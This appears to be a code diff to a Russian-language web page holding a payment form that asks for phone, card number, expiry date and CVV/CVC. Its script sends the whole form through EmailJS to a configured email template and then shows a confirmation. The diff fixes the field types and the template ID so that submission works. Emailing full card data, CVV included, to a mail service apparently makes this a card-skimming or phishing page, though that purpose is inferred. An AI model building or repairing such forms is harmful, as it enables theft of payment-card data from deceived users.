@@ -60,7 +60,7 @@
 									<label class="label">
 										Телефон:
 									</label>
-									<input type="number" class="input1" name="phone">
+									<input type="tel" class="input1" name="phone">
 								</fieldset>
 								<fieldset>
 									<label class="label">
@@ -83,11 +83,11 @@
 								<label class="label2">
 									Номер карты
 								</label>
-								<input type="number" class="inp_karta_1" name="card_number">
+								<input type="text" class="inp_karta_1" name="card_number">
 								<label class="label2" style="	margin-top: 6px;">
 									Действует до
 								</label>
-								<input type="number" class="inp_karta_2" name="expiry">
+								<input type="text" class="inp_karta_2" name="expiry">
 							</div>
 							<div class="karta2">
 								<div class="poloska">
@@ -95,7 +95,7 @@
 								<label class="label3">
 									CVV/CVC
 								</label>
-								<input type="number" class="inp_karta_3" name="cvv">
+								<input type="text" class="inp_karta_3" name="cvv">
 								<p class="p_karta">
 									С обратной <br> стороны
 								</p>
@@ -159,7 +159,7 @@
   const cancelBtn = document.getElementById('cancelbtn');
   form.addEventListener('submit', function(event) {
     event.preventDefault(); 
-    emailjs.sendForm('service_cv0zt8k', '46nt10e', this)
+    emailjs.sendForm('service_cv0zt8k', 'template_46nt10e', this)
       .then(() => {
         modal.showModal(); 
         this.reset(); 
